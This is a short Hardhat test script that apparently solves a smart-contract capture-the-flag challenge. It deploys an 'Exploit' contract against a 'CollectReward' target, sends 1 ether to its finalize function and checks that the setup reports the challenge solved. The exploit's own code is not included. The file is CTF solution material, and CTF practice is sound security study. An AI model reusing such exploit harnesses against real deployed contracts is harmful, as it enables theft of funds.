import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_smbsp, CHALLENGE_smbsp} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/smbsp/Setup.sol:Setup`, SETUP_smbsp)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/smbsp/CollectReward.sol:CollectReward`, CHALLENGE_smbsp)).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_smbsp);
});

it("info", async function () {
    // console.log(await ethers.provider.getBalance(await challenge.address));
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/smbsp/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    await exploit.finalize({value: await ethers.utils.parseEther("1")});
    expect(await setup.isSolved()).to.eq(true);
});